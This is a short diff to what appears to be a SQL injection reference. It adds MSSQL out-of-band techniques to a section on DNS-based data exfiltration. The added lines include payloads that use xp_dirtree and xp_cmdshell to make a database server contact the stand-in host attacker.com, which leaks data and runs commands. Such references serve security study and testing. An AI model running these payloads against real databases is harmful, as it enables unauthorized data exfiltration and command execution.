@@ -265,3 +265,13 @@ Uses LOAD_FILE() to trigger DNS lookup.
 `SELECT database()` => pulls database name
 `CONCAT()` => builds string
 `LOAD_FILE()` => reading the file path
+
+### MSSQL Techniques (Microsoft SQL)
+
+`xp_dirtree` => triggers dns lookup by trying to show the list on a remote server
+
+`EXEC master..xp_dirtree '\\attacker.com\share';`
+
+`xp_cmdshell` => triggers command running, turned off by default
+
+`EXEC xp_cmdshell 'nslookup data.attacker.com';`
